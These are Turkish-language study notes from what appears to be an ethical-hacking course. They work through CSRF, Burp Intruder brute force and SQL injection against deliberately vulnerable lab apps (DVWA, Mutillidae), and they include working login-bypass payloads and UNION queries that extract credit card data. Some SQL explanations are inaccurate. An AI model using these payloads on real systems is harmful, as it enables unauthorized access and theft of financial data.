+csrf in hackerlar tarafından gerçek hayatta nasıl kullanıldığıylea ilgili bir uygulamalı örnek yapacağız öncelikle /var/www/html/index.html dosyamızı 
+sağ tık open with geany ile açıyoruz 
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1> hacked </h1> 
+<img style="display:none", src="password_new=atil&password conf=atil olan url (url de şifre böyle değil ama atil oalrak değiştireceğiz" , alt="" >
+</body>
+</html>
+display:none bu etiket içerisinde herhangi  bir görsel gösterme demek
+alt="" de herhangi bir alternatif metin belirtme demek 
+ardından bu dökumanı kaydedip lokalimizde yayına almak için terminale service apache2 start yazıyoruz daha inandırıcı olmak için hacked yazılması yerine daha normal gözüken 
+içerik ve tasarım tercih edilebilir daha sonra kalideki ip adresimizi aynı ağda bulunan bir bilgisayarın tarayıcısında açtığımızda csrf açığı çalışmış olacaktır ve dvwa deki şifremiz
+atil olarak değişecektir 
+
+bu dersimzide brute force saldırılarını göreceğiz brute force birden fazla seçeneği deneyerek şifreyi bulmak diyebiliriz 
+bunun için dvwa kısmındaki sol taraftaki brute force kısmını kullanacağız şimdi foxy proxy i etkinleştirip burp suit de intercept i çalıştırıyoruz 
+ardından admmin test diyip logine basıyoruz daha sonra burpde yakalanan bu istekte boş beyaz bir alanda sağ tık yapıp send to intruder diyoruz 
+daha sonra üstten intruder tabına gidiyoruz intruder>position kısmında isteğimizin kendisini görüyoruz bu kısımda hangi parametrelere brute force uygulayacağımızı seçebiliriz 
+default da bütün parametreleri test edecek şekilde açılıyor ama biz hepsini test etmek istemiyoruz bunun için sağdaki clear butonuna basıyoruz biz sadece password parametresini 
+test etmek istiyoruz password= kısmından sonraki şifremizi içeren stringi imleç ile seçip sağdaki add butonuna basarsak test edileceği anlamına gelen mavi bir renk oluşacaktır
+bu parametrede bir de bu kısmın üstünde attack type var buradaki saldırıların hepsi brute force içindir genelde tek parametrenin denendiği uygulamalarda sniper saldırı türü kullanılır 
+ardından intruder>Payloads tabına gidiyoruz payloads set kısmında kaç adet parametrenin test edileceği yazar payload type da saldırının nasıl olacağı ile ilgili farklı metodlar yer alır 
+örneğin simple list seçeneğinde en çok kullanılan şifrelerin yer aldığı bir wordlist içerisinden şifreleri tek tek deneyerek bulmaya çalışır 
+numara,tarih bulma gibi pek çok farklı seçenek de yer alır ardından hemen aşağısında payload options kısmında istersek kendimiz eklediğimiz stringlerle bir liste oluşturup sadece bunları 
+deneyebiliriz istersek de daha önce bu tarz uygulamalar için kullanılan wordlistleri de seçerek kullanabiliriz ya da sol tarafta bulunan load butonundan hazır listeelri seçebiliriz 
+/usr/share/wordlist  burada kalide hazır gelen pek çok wordlist bulunur buradaki rockyou.txt dosyası 15mb civarı bir dosyadır ve içerisinde oonbinlerce şifre var ama denemesi 
+çok uzun sürecektir en geniş kapsamlı şifre listelerinde nbir tanesidir fasttrack.txt de en çok kullanılan 200-300 adet şifrenin yer aldığı uygulanması daha kolay olan bir dosyadır 
+biz fasttrack i seçiyoruz seçtiktek sonra içerisindeki istemediğimiz gelimeleri seçip remove ile kaldırabiliriz ya da enter a new item kısmındaki inputtan yeni bir item girerek bu listeye 
+ekleyebilriz bu kısmın en aşağısında payload encoding seçeneğinde eğer şifreler içerisinde özel karakterler denenecekse bunu url de otomatik olarak hazır hale getirmeye yarayan bir seçenek 
+bu tikli olması gerekiyor ardından intruder>options tabına geliyoruz burada numbers of threads kısmı her seferinde kaç adet istekte bulunacağımızı belirttiğimiz kısımdır 
+ama ücretisz versiyonunda sadece 1 istekte bulunabiliyourz pause before retry kısmı bir sonraki isteği kaç mili saniye sonra gerçekleştireceğimizi belirttiğimiz kısımdır 
+1000ms=1s  ardından tekrar positions a gelip sağ üstten start attack dediğimizde ücretsiz versiyonunu kullandığmızı ve işlemin uzun sürebileceğini söylüyor burp  OK diyip başlatıyoruz 
+denenen şifreler status ve lenght değerleri ile beraber listelenir status 200 kodu bir cevap aldım (olumlu veya olumsuz serverdan bir response aldım demek) 404 bulunamadı demek 
+500 server cevap vermedi demek bunlar html response kodlarıdır her istekte altta response >  raw kısmında alınan response cevabının html kodları arasında denenen şifre yanlışsa 
+username password incorrect yazar biz burada ayırt edici olması amacıyla lenght e bakacağız 4882 olanlar yanlış şifre denemesine verilen response lar ama aralarındaki farklı 
+bir response u bulmamız gerekiyor örneğin 4942 lenght olan çıktının response>raw ına baktığımızda welcome to the password protected area admin yazısını görüyoruz 
+bu değeri içeren iligi payload ın hangisi olduğuna bakarak da denediğimiz parametre için girerek doğrulayabiliriz 
+
+bu bölümde burp suit intruder kullanımını öğreneceğiz 
+örneğin bir siteye geldik giriş yapmadık ne kullanıcı adı ne de bir şifre bilmiyoruz ne yapmalıyız -kullanıcı adları tahmin edilebilir aynı şifre denemeleri yaptığımız gibi-
+öncelikle foxy proxy i açıyoruz daha sonra intercept i açıyoruz dvwa e geliyoruz brute force kısmında username - password kısmına test test yazıp logine tıklıyoruz 
+giden request e sağ tıklayıp send to intruder diyoruz intruder > positions a geliyoruz > sağdan clear diyoruz username=test ve password=test kısmındaki test kelimelerini seçip 
+add diyoruz attack type olarak cluster bomb u seçiyoruz payloads tabına geliyoruz payload set 1 iken aşağıda aranılacak stringleri eklediğimiz kısma geliyoruz 
+test,guest,admin,administrator u tek tek ekliyoruz daha sonra payload set i seçip 2 yapıyoruz pass, test p@ssw0rd! password stringlerini ekleyip sağ üstten start attack 
+diyoruz 
+
+pitchfork 2 adet liste öğreğin username - password şeklinde iki liste oluşturursak 2 listede birbirine karşılık gelen stringleri username ve password olarak deniyor 
+clusterbomb da ise her username i ve şifreyi tek tek deniyor 
+
+SQL, verileri yönetmek ve tasarlamak için kullanılan bir dildir. SQL, kendisi bir programlama dili olmamasına rağmen birçok kişi tarafından programlama dili olarak bilinir. 
+SQL herhangi bir veri tabanı ortamında kullanılan bir alt dildir. Structured Query Language'dir açılımı 
+sql in kullanım amacı genel olarak şöyledir hizmet verilen bir serverımız var ve bu sunucumuzun içerisinde bir veri tabanı var zaten bir çok web sitesinde veritabanı olur 
+o sitedeki kullanıcıların adını , fotoğrafını , diğer çeşitli bilgilerinin tutulduğu kısımdır sadece kullanıcılar için de değil o websitesinde gösterilecek bilgiler de veri tabanında tutulur 
+normalde sql de işlem yapmak için bir sql sunucusu kurmamız gerekir ama biz işlemlerimizi ve yazacağımız kodları internet üzerinden praitk edebileceğimiz bir sitede yapacağız 
+bunun için kullanacağımız site https://sqliteonline.com/ dir sqlite girdiğimizde karşımıza örnek olarak demo isminde bir tablo çıktığını görürüz ve tabloya baktığımızdas
+sql in yapısının excel gibi olduğunu görüyoruz sayfanın sol tarafında table başlığının altında mevcut tablolarımızı görüntüleyebiliriz ve tablo da kendi içinde 2 ana yapıya ayrılır 
+1. column (sütün) 2. row (satır) bu uygulamamızda id name ve hint sütunları var komutlarımızı yukarıdaki input kısmından giriyoruz ve girdiğimiz komutları çalıştırmak için de 
+en üssteki ikonlardan mavi olan Run butonuna basmamız gerekiyor inputta SELECT * FROM demo; yazıyor 
+* (yıldız) karakteri genel olarak programlamada ya da bu gibi komut istemcilerinde her şey (everything) anlamında gelir bu komutta demo isimli tablodaki her şeyi (bütün verileri)
+seç anlamına gelir ve bu komutu çalıştırdıktan sonra da aşağıda görmüş olduğumuz tablo gelmiş oluyor biz de bu tablo gibi kendimiz bir tablo oluşturabiliriz 
+genelde zaten bir veri tabanı oluşturulduğunda birden fazla tablo oluşturulur kullanıcılar tablosu olur onun içinde kullanıcıların bilgileri saklanır bloglar tablosu olabilir 
+onun içinde de kullanıcıların girdiği postlar yer alır bir tablo oluşturmak için input kısmına CREATE TABLE IF NOT EXISTS bu komut şu anlama gelir if not exist (eğer yoksa,mevcut değilse)
+CREATE yani oluştur ... isimli bir tablo mevcut değilse onu oluştur anlamına gelir bunu yazdıktan sonra oluşturmak istediğimiz tablonun ismini (name) vermemiz gerekiyor 
+isimlendirme yaparken türkçe karakter,boşluk,özel karakterler kullanılmamalıdır ve bundan sonra da tablomuzun içerisinde yer alacak columns yani sütun değerlerini(başlıklarını) 
+yazmamız gerekiyor tablolara id sütunu koymak zorunlu değildir ama çok mantıklı bir işlemdir örneğin isimlerin tutulduğu bir tablo var aynı isim soyisme sahip 2 adet veya daha fazla kişi olabilir 
+bu gibi durumlarda spesifik olarak bir kişinin o olduğunu o kişiye benzersiz bir id numarası vererek gerçekleştireibliriz böylece aynı isim veya soyisme sahip olan her verinin
+kendine ait ve diğer hiç bir veride bulunmayan bir numarası olacaktır bundan sonra parantez açıp (sütunların isimlerini ve hangi veri tipine ait olduklarını yazmamız gerekiyor)
+(id INTEGER PRIMARY KEY, name VARCHAR, age INTEGER)
+PRIMARY KEY yazdığımızda sql o sütunun id için oluşturulacak olduğunu anlar VARCHAR da o sütün isminin altındaki değerlerin METİNSEL ifadeler olacağını tanımlar 
+CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, name VARCHAR, age INTEGER) ; yazarak id ve veri tipi tam sayı name yani isim isminde bir sütun beiliyoruz veri tipi metin 
+ve son olarak age yani yaş ve veri tipi tam sayı olarak tanımlıyoruz ve Run a bastığımızda karşımıza hiç bir çıktı gelmiyor ama sol tarafta Table başlının altında test isimli 
+tablomuz oluşuyor  ve bunun içerisine bir veriyi nasıl kaydederiz bundan sonra da o veriyi nasıl çekebilriz  bir sonraki dersimizde bunu öğreneceğiz 
+
+SELECT *FROM test yazıp run yaptığımızda hiç bir çıktı alamayacağız çünkü tabloda hiç bir veri yok 
+INSERT INTO test (name,age) VALUES ('Atil',50); komutunu yazarak INSERT (koy,ekle anlamına gelir) INSERT (test isimli tablonun içine (ekle demektir))
+(name,age) tablodaki bu sutunlara birazdan gireceğim değerleri ekle diye belirtiyoruz VALUES (değerler) ('Atil',50)  burada atiil ın tırnak içerisinde yazılmaısnın sebebi
+bir VARCHAR (string) değeri olmasıdır 50 nin de tek başına yazılmasının sebebi bir integer veri tipine sahip olmasından dolayıdır 
+bu komutu çalıştırdıktan sonra hiç bir çıktı almayacağız çünkü tabloya bir veri ekleme işlemi yaptık veri çağırma işlemi değil eğer veri çağırırsak eklediğimiz bu  veriler 
+gözükecektir SELECT *FROM test; komutu ile eklenip eklenmediğini doğrulayabiliriz kodu çalıştırdığımızda id =1 name=atil age=50 çıktısını alıyoruz her bir sütun için 
+peki id yi belirtmemize rağmen neden query (sorgu) işleminde bu veri geldi sebebi biz tablo ve sütun oluştururken en baştaki sütun için PRIMARY KEY diye bir ifsade 
+kullanmıştık bu bir veri parçası eklendiğinde buna ait bir de sadece o veri satırına ait benzersiz id tanımlanmasına karar verdik bu yüzden id de getirildi 
+
+pek çok verinin bulunduğu bir veritabanından sadece belirli verileri getirmek için filtreleme yappmamız gerekiyor örneğin ilgili tabloda yalnızca id si 3 olan satırı getirmek istesek 
+SELECT *FROM test WHERE id =3; komutunu kullanırız başka bir örnek olarak örneğin bir tablodaki name sütunundaki isimlerden yalnızca A harfi ile başlayanları getirmek istesek 
+SELECT *FROM test WHERE name ='A%'; komutunu kullanabiliriz yine aynı şekilde belirli bir harf ile biten verileri getirmek için de SELECT *FROM test WHERE name ='%d';
+komutunu kullanabiliriz 
+
+UPDATE test SET age =33 WHERE id=1; komutu ile de tabloda id si 1 olan verinin age sütunundaki değeri 33 yapabiliriz yine aynı şekilde 
+UPDATE test SET age =34 WHERE name='Atil'; komutunu kullanarak da bu isimdeki kişinin yaşını da değiştirebiliriz 
+DELETE FROM test WHERE id=4;
+SELECT *FROM test; komutu ile de test tablosundaki 4 numaralı id nin bulunduğu satırı tamamen silebiliriz ardından da select komutu ile güncel halini getirebiliriz tablomuzun 
+tamamının 
+
+bu dersimizde birleşik query UNION Query çeşidini öğreneceğiz 
+
+test tablomuzda 4-5 adet satır olduğunu varsayarsak 
+SELECT *FROM demo UNION SELECT *FROM test; komutunu çalıştırdığımızda 2 tablodaki verileri birleştirip getirecektir ancak her iki tabloda da id si aynı olan elemanlar olduğu için 
+aynı id ye sahip 2 adet satır göreceğiz bir de komut sırasına göre önce demo tablosunu çalıştırdığımız için son sütunumuz Hint olarak değişecektir eğer 
+SELECT *FROM test UNION SELECT *FROM demo; şeklinde çalıştırsaydım 3. sütunum Age olacaktı 
+her iki komutta da ortak olarak aynı id ye sahip olmasına rağmen öncelik test tablosunda olacak 1. satırda test tablosundaki veriler 2. satırda demo tablosunun 1. satırındaki veriler 3. de test deki 2. 
+4. de de demodaki 2. şeklinde gidiyor UNION sorgularında birleştirilecek 2 tablonun da sütun sayısı aynı olmak zorunda aynı değilse Sql bize bir hata verecektir 
+
+bu dersimizde test2 isminde 4 adet sütuna sahip bir tablo oluşturuyoruz ve bu tablomuzun sütun sayısını bilmediğimizi varsayarak tahmin yürütme işlemi yapacağız 
+SELECT *FROM test2 UNION SELECT 1 FROM test; bu komut test tablosundaki 1. sütun ile test2 deki bütün verileri birleştir demek bunu yazdığımız zaman hata alacağız çünkü biz biliyoruz ki 
+UNION query çalıştırdığımızda eğer hata alıyorsak sol ve sağdaki tabloların sütun sayısı birbirine eşit değil bu buradan şunu anladık ki test2 nin sütun sayısı 1 değildir 
+daha sonra SELECT *FROM test2 UNION SELECT 1, 2 FROM test; / SELECT *FROM test2 UNION SELECT 1, 2, 3 FROM test; komutlarını da çalıştırıyoruz ve hata aldık yani test2 nin sütun sayısı 
+ne 2 ne de 3 dür denemeye devam ediyoruz / SELECT *FROM test2 UNION SELECT 1, 2, 3, 4 FROM test; ü deniyoruz ve çalıştı hata almadık bu da demektir ki test2 nin sütun sayısı 
+4 tür aldığımız çıktıda test ismindeki 1 2 3 4 değerlerini test2 nin ilk satırında yazdırdı id=1 name=2 surname=3 age=4 olacak şekilde 
+ancak burada dikkat etmemiz gereken şey birleştirilen tablonun satır sayısı 4 oldu yani test den çağrılan 1 2 3 4 birleştirilen tablonun ilk satırına eklendi 
+
+örneğin bizim istediğimiz şet test tablosunun içerisindeki sütun isimlerini bulmak olsun bunun için de tahmin işlemini kullanabiliriz 
+SELECT *FROM test2 UNION SELECT id, 2, 3, 4 FROM test; yazdığımızda birleştirilen tablomuzdaki 1. satırdaki 1 değerinin bulunduğu sütunun altında test tablomuzdaki id ler eklendi 
+eğer 2 olan kısma name yazarsak bu sefer onun bulunduğu sütunun sonuna test tablosundaki name sütunundaki değerler eklenecek UNION sorgunun mantığı bu şekildedir 
+eğer tahmin ettiğimiz sütun isimleri test tablosunda mevcut değilse bu isimde bir sütun olmadığına dair bir hata alırız 
+
+
+bu dersimizde sql açıklarını bulmayı öğreneceğiz 
+kali ve metasploitable ı nat networkde çalıştırıyoruz ; kali browserından ms ipsini yazıp enterlıyoruz mutillidae yi açıyoruz soldaki kısımdan owasp top ten  > a1 injection 
+> sqli bypass authentication > login kısmına tıklıyoruz burası veritabanına isim ve şifre ile giriş yaptığımız bir örnektir 
+login butonunun altındaki please register here kısmından kendimize bir hesap oluşturabiliriz 
+bu gibi form(input) içeren uygulamalarda bir enjeksiyon olup olmadığını anlamanın en kolay yolu "(tırnak işareti) ni kullanmaktır çünkü buraya kullanıcı adı şifre girdiğimizde 
+girmiş olduğumuz kullanıcı adı ve şifre veritabanında mevcut mu diye bir sorgu oluşturuyoruz biz aslında ve username veya password ün içine farketmez " işareti kullandığımızda sql de 
+metinsel ifadeler " " işaretlerinin arasına yazılıp yollandığı için bu sistemde bir hata ya yol açacaktır yani sorguda ki en son gidecek karakter " (tırnak işareti) olması 
+gerektiğinden dolayı ancak sorguda tek bir tırnak işareti ve başka bir şey mevcut olmadığı için webaitesi bize çeşitli detaylar içeren hata mesajları verecektir biz de bu hata 
+mesajlarındaki detayları kullanıp buraya bir sql injection uygulamaya çalışacağız normalde bu kadar detaylı hata mesajları verilmez yüzeysel bir hata mesajı verilip geçilir güvenlikten 
+dolayı ancak bu site hacklemeyi kolaylaştırmak/öğretmek için oluşturulduğu için bu tarz hata mesajları biizm için ipucu olacaktır 
+
+username:oluşrurduğumuz kullanıcı adını 
+password:" girip login e tıklıyoruz bize verilen hata mesajı tablosundaki diagnotic information satırına bakarsak orada SELECT *FROM accounts WHERE username='atil' AND password=""
+yazıldıığnı görüyoruz bu ifade şu anlama geliyor ki burada yaptığımız sorgu sitenin sql veritabanındaki accounts tablosundaki bütün verilere gönderilmiş bir sorgudur 
+sql sorgusunda hem username i hem password sorgusunuu VARCHAR veri tipi olarak gönderir 
+
+SELECT *FROM accounts WHERE username='atil' AND password='1' sorgumuzu bu şekilde gönderirsek login olamayacağız çünkü şifremiz 1 değil 
+SELECT *FROM accounts WHERE username='atil' AND password='1'  AND 1=1 sorgumuzu bu şekilde gönderdiğimizde yine çalışmayacaktır çünkü AND operatörünü kullandığımız uygulamalarda 
+koşulların tamamındaki durumlar true yani doğru olmalıdır/geçerli olmalıdır burada 3 durum var birincisi username in atil olması bu durum doğru çünkü kullanıcı adımız gerçekten 
+atil 2. koşul password un 1 olması bu koşul yanlış çünkü şifremiz 1 değil 3.durum ise 1=1 yani 1 eşit midir 1'e ? sorgusu bu da doğru çünkü 1, BİR e eşittir 
+ama 3 ü de doğru olmadığı için login olma işlemi gerçekleşmeyecektir ama 1. AND den sonra yani şifre girdikten sonra bir AND daha çalıştırabiliyorsak bu şu anlama gelir buraya 1=1 
+değil de başka koşullar da yazıp çalıştırabiliriz ancak burada şöyle bir problem var ki biz sonu 1=1 ile biten komutu çalıştırmak istediğimizde sql sadece VARCHAR veri tipine 
+ait sorguları kabul ettiği ve 1=1 de bir VARCHAR olmadığı için sonuna tek tırnak (') karakterini ekleyecektir 1=1 de sonuna bu karakter eklendiği için çalışmayacaktır 
+ama bunu da bypass etmek için # veya bazı sql frameworklerinde (-- [2 tane tire/kısa çizgi]) işaretini de kullanabiliriz peki şifremizin yanlış olduğunu biliyoruz ve 2. kısımda
+zaten hata verecekse 3. kısımın çalışıp çalışmayacağını nereden biliyoruz aslında tam olarak emin olamayız bu yüzden şifremizi girdiğimiz 2. kısıma gerçek parolamızı yazıp 
+3. koşulun çalışıp çalışmadığını doğrulayabiliriz eğer HİÇ BİR hata mesajı almadan login olabilirsek bütün koşullar başarılı bir şekilde çalıştırılmış demektir 
+
+(!!!input kısmına username:kullanıcı-adımızı pasword:şifremiz' AND 1=1# yazıp login oluyoruz)
+
+ve hiçbir hata mesajı almadan giriş yapmayı başardık 
+
+bu dersimizde sql injection u kullanarak şifre girmeden login olmayı öğreneceğiz 
+bu uygulamada yapmak istediğimiz şey şu sorgu işleminde şifre koşulunu bypass edip yani hiç bir şifre girmeden sisteme login olabilir miyiz bunu yapmaya çalışacağız 
+bunun için yine # karakterini kullanabiliriz peki username e atil# yazarsak çalışır mı hayır çünkü sql kunnaıcı adını 'atil#' olarak gönderecek sorguya 
+bu yüzden username e 'atil'# yazıyoruz ve şifreye herhangi bir şey yazıyoruz (hash karakterinden sonra sql kendisi bir adet ' işareti koyacak ama bir karakterin engelleneesi için
+en az iki adet tırnakişareti karakterinin içerisinde bulunması gerektiğinden # karakterimiz çalışacaktır ve bir hata mesajı almadan sisteme login olmayı başardık )
+sadece kendi kullanıcımız ile değil admin kullanıcı ismiyle (admin kullanıcısı admin yetkilerine sahip kişidir) de login olabiliriz bunun için yine aynı şekilde 
+username:admin'# password:herhangibirşey yazıp login oluyoruz ve admn olarak giriş yaptık admin yetkisine sahip olan kullanıcının kullanıcı adı her zaman admin olmayabilir bunu deneyerek
+tahmin ederek bilgi toplayıp uygulayarak pratik edebiliriz 
+
+bu dersimizde yine basit bir sql açığını kullanarak yine şifresiz olarak login olmayı öğreneceğiz bu yugulamada da mutillidae 
+username:atil
+password:1' OR 1=1#
+password:1' OR 1=1--
+SELECT *FROM accounts WHERE username='atil' AND password='1' OR 1=1'#'
+
+kodunu çalıştırmak istiyoruz 
+mutillidae login kısmına geliyoruz username kısmına atil password kısmına da 1' OR 1=1# yazıp login olduğumuzla atil kullanıcı adını yazmamıza rağmen 
+admin ile giriş yaptık burada AND operatörünü öğrenmiştik işlemin başarıyla gerçekleşmesi için bütük şartların (2 koşulun da doğru olması lazım)
+bu örnekte operatörlere OR da eklendi bu operatör veya anlamına gelir ve AND den farklı olarak koşullardan birinin doğru olması halinde 
+işlem başarıyla gerçekleşecektir peki biz atil kullanıcı ismiyle giriş yapmamıza rağmen neden admin olarak bağlandık bunun sebebi şu olabilir 
+biz giriş yaptığımızda SELECT *FROM accounts WHERE username='atil' AND password='1' OR 1=1'#' sorgusu çalıtırıldı sql bu sorguyu şu şekilde 
+değerlendirmiş olabilir öncelikle username='atil' AND password='1' koşullarını görüp kullanıcı adı olarak atil var mı? diye sorguladıktan sonra 
+var olduğunu doğruladı şifre kısmına geldiğinde şifresinin 1 olmadığını gördü ve AND operatöründen dolayı işlem başarısız oldu ancak bundan sonra 
+gelen OR operatörü ile fail olma durumunda 2. bir alternatif olarak OR u değerlendirip 1=1 işleminin eşit olduğuna karar verip 1 numaralı kullanıcı ile
+giriş yaptığından dolayı ve genelde de sistemlerde 1 numaralı kullanıcı admin olduğundan dolayı admin ile giriş yaptık 
+
+bu dersimizde sql injection işlemlerimizde security level ı arttıracağız en son kaldığımız login sayfasının üstündeki sekmelerden 
+toggle security i seçiyoruz ve security level ımız 1 oldu(arttı) name kısmına atil password kısmına 1' OR 1=1# yazıyoruz ve login olduğumuzda
+site bize dangereous character  detected (tehlikeli karakter tespit edildi mesajı verecektir) bu hata mesajını daha iyi anlamak için 
+burpsuite i açıyoruz foxyproxy den proxy i etkinleştirip burpden intercept i açıyoruz tekrar aynı username password ile login oluyoruz 
+ancak burpsuit hiç bir istek yakalamadı bunun sebebi bu isteğin sunucuya gönderilmemesidir yani burada yapılan isteklerin client-side 
+da yani browserda gerçekletiğini görüyoruz bu da intercept açıkken isteği yakalayabilidiğimiz bir username ve password la örneğin atil atil 
+ile giriş yaparak intercept>params kısmından password parametresinin value değerini 1' OR 1=1# olarak değiştirip bu şekilde forward edebileceğimiz 
+anlamına gelir forward ettiğimizde de admin olarak giriş yaptığımızı görebiliriz 
+
+bu dersimizde sql injection get açıkları ve decoder kullanımını öğreneceğiz lai ve metasploit makinalarımız açık 
+kali browserımızdan ms ip sini girip mutillidae > sol taraftaki owasp top 10 > a1 injection > sqli extract data kısmına tıklıyoruz 
+bu uygulamada username ve şifresini girdiğimiz kullanıcı hakkında bize bazı bilgiler5 gösterilir 
+burada gelen giden trafiğin nasıl olduğunu görmek için burpsuit i açıyoruz foxy proxy i açıyoruz intercept i açıyoruz daha sonra username:atil 
+password:sifresi-neyse
+ girdikdikten sonra intercept de giden isteğin bir get isteği olduğunu görüyoruz ve browserda url da bu get isteğinde kullanılan parametreleri 
+ ve değerlerini görebiliriz burada daha önceki derslerde kullandığımız '# karakterlerini kullanacağız 
+ username:atil'# yapıyoruz ve şifreyi de 1 yapıyoruz submit ettiğimizde  ilgili kullanıcının username password ve signature unu görebiliriz 
+ aynı işlemi admin kullanıcısında da denediğimizde username:admin'# password:1 yazıyoruz ve adminin de bu bilgilerinin getirildiğini görüyoruz 
+ bazen bu inputlara girmek yerine url de belirtilen parametrelere yazarak yapmamız gerekebilir 
+ admin'# ile adminin bilgilerini getirdiğimizde url de username=admin%27%23 şeklinde bir ifade görürüz halbuki biz admin'# yazmıtık url de bu 
+ şekilde gözükmesinin sebebi bazı özel karakterleri get isteği içerisinde olduğu gibi kullanarak server a gönderemeyiz öncelikle bu karakterleri 
+ html in anlayacağı bir şekilde decode etmemiz gerekiyor bu durumda da '(tırnak işareti) = %27 yi # de = %23 anlamına gelir 
+ peki göndereceğimiz parametrenin decode edilmiş halini nasıl görebiliriz bunun için brupsuit deki en üsttki tablardan Decoder ı kullanabiliriz 
+ üst kısma '# ı yazıp encode as > URL yi seçersek bu karakterleri encode eder ve %23%27 çıktısını alırız 
+ encode olmuş bir ifadeyi decode etmek için de üste ilgili ifadeyi yazıp sağında bulunan decode as > URL ye tıkladığımızda %23%27 ifadesini 
+ decode ederek '# çıktısını verecektir bize 
+ sql de ORDER BY 1# komutu ne işe yarıyor araştır 
+ peki biz bu ilgili kulanıcının username ve password ünü giridğimizde onun hakkında daha detaylı bilgi almamızı sağlayan inputlarda union select 
+ komutunu çalıştırabilir miyiz 
+ bunun için username:atil' union select 1# komutunu yazıyoruz password:1 yazıp view account details butonuna basıyoruz ve bir hata mesajı aldık 
+ verilen hata mesajı tablosunun Message satırındaki değeri okursak kullandığımız union select komutunda sol ve sağ taraftaki işlemlerin/tabloların 
+ aynı sayıda olmadığını söylüyor bu hata ile daha önce de karşılaşmıştık union select komutumuzu çalıştırmak için tahmin yoluyla 2 taraftaki 
+ sütunların sayısını birbirine eşitlememiz gerekiyor bunun için de atil' union select 1,2# ve sırayla 1,2,3,4,5# e kadar ekleyerek deniyoruz 
+ atil' union select 1,2,3,4,5# çalıştı (kullanıcının bilgilerinin verildiği kısımda 3 adet satır vardı neden 5 tane sütün deneyince çalıştı
+ acaba view acoount details dediğimizde sadece satırları mı getiriyor ve hangi tablodan getiriyor buradaki satırlar aynı zamanda sütün mu yoksa
+ kullanıcının detaylı bilgilerinin geldiği örnekte sütunlar hiç gözükmüyor mu bunları araştır)
+atil' union select 1,2,3,4,5# kısmında 1,2,3,4,5 olan kısımlara sql de tablolarda en çok kullanılan tablo isimleri ya da satır değerleri,sütun 
+değerlerini yazarak önemli bir bilgi elde edebileceğimizi kontrol edebiliriz örneğin atil' union select database(),user(),version(),4,5# 
+yazıp şifreyi de 1 yapıp view dersek bize sorgu yaptığımız database in ismini, database in hangi kullanıcıya bağlı olduğu ve database in versiyonu 
+gibi önemli bilgileri çekebilriiz burada sütün isimleri kısmına girdiğimiz bilgiler illa ki SADECE sütunlara ait isimler,başlıklar olmak zorunda değil 
+tablo içerisinde sütun ismi olarak veya tablonun içerisinde geçen herhangi bir ifade de olabilir 
+
+sql de information_scheme isimli bir tablo bulunur bunun içerisinde bizim sql veritabanımız içerisinde tablo isimleri, column(sütun)
+ isimleri burada kayıt edilir 
+
+ username: atil' union select 1,table_name,3,4,5 from information_scheme.tables#
+ information_scheme.tables kısmı information_scheme dosyasının içerisinden ilgili veritabanında bulunan table yani tbloların isimlerini getir 
+ demek(daha doğrusu bu tablo isimlerinin bulunduğu llistede bir sorgu çalıştır from bu kısımdan bilgi getir/sorgu yap demek)
+ information_scheme.tables kısmındaki verileri de union select te table_name olarak çağırırız 
+
+ view your detail kısmındaki name: atil' union select 1,table_name,3,4,5 from information_scheme.tables# password:1 yazıp view butonuna basıyoruz 
+ 3,4 veya 5 den herhangi birinde bir değer gelmezse null yazarak burayı boş bırakabiliriz 1,table_name_null,null,null şeklinde hangisine bir bilgi gelmezse! 
+
+ viewlediğimizde 237 adet çıktı geldi burada tablo isimlerini aldık buradaki table name ler sadece owasp10 deki veritabanının değil bütün 
+ veritabanlarındaki bütün table name ler biz bu database e root kullanıcısı ile bağlı olduğumuz için/sorgu gönderdiğimiz için bütün veritabanlarındaki 
+ bütün table name ler geldi çünkü hepsine yetkimiz var sadece owasp10 isimli veritabanındaki table nameleri getirmek için de 
+
+ atil' union select 1,table_name,3,4,5 from information_scheme.tables where table_scheme='owasp10'#
+ password:1 yazıp enterladığımızda sadece owasp10 e ait tablo isimleri getirilecektir 
+
+ name kısmına atil' union select 1,column_name,3,4,5 from information_scheme.columns where table_name='credit_cards'#
+ password a da :1 yazıp enterladığımızda credit_cards isimli tablosundan from information_scheme.columns dosyasının içerisindeki yani credit cards 
+ tablosunun içerisindeki sütun isimlerinin tutulduğu table?-table mı doya mı araştır- column_name leri yani sütunların isimlerini çektik 
+
+tekrar  name kısmına atil' union select 1,ccnumber,ccv,expiration,5 from credit_cards#
+password=1 yazıp viewlediğimizde bu sefer credit_cards isimli table daki ccnumber,ccv,expiration sütunların altındaki/içindeki bilgileri 
+bu sütunlara ait olan bilgileri getirdik //ccnumber=kredi kartı numarası//ccv=arkasındaki 3 haneli güvenlik kodu//expiration ne araştır 
+
+bu bölümümüzde kör enjeksiyonları görelim 
+
+hem kali hem ms nat network de açık browserdan ms-ip sini yazıp dvwa e giriyoruz username:admin pasword:password yazıyoruz (aşağıda default şifrenin ne olduğu yazıyor)
+sql injection blind (yani kör enjeksiyonlarda) normalde örneğin ip ile ping attığımız uygulamada 192.168.1.1;ls dediğimizde önce ip yi pingleyip sonla ls çalıştırıp 
+içinde bulunduğumuz dizindeki dosya ve klasörleri yazdırken ekrana kör enjeksiyonda böyle olmaz ls çalışsa bile bir çıktı alamayabiliriz 
+burada bir blind enjeksiyon var mı bunu test etmek için netcat ile bir shell açıp bunu doğrulayabiliriz 
+örneğin dvwa de solda sql injection (blind) kısmındaki inputa ' koyup submit ettiğimizde hiç bir çıktı almıyoruz halbuki diğer uygulamalarda 
+' işaretikullandığımız zaaman bize bir hata mesajı veriyordu burada blind olduğu için vermedi yani kısaca bir çıktı veya reaksiyon/tepki/hata mesajı 
+almamamız orada enjeksiyon olmadığı anlamına gelmez buradaki inputa 1'union select 1,table_name,3,4,5 from information_scheme.tables#
+diyip submit ediyoruz ancak bir çıktı almıyoruz muhtemelen burada column sayısını yanlış belirledik
+1'union select 1,table_name,3,4 from information_scheme.tables# denedik yine olmadı 1'union select 1,table_name,3 from information_scheme.tables#
+deniyoruz yine olmadı 1'union select 1,table_name from information_scheme.tables# diyip çalıştırdığımızda table isimlerini çektik 
+bu uygulamada aslında/normal olarak bir kullanıcının id sini girmemizi ve girdiğimiz id ye göre o kullanıcının First Name ve Surname ini getirdiği 
+için burada kullanılan sütun sayısı 2 diyip çalışmasının sebebi de bu olarak belirledik çalıştığımız url deki tablonun amacına göre bu şekilde tahminler 
+yürütebiliriz 
+
+sütun sayısı 2 olduğu için 1'union select database(),user()# komutunu sql injection blind inputuna submit ettiğimizde database(dvwa) ve user(root@localhost)
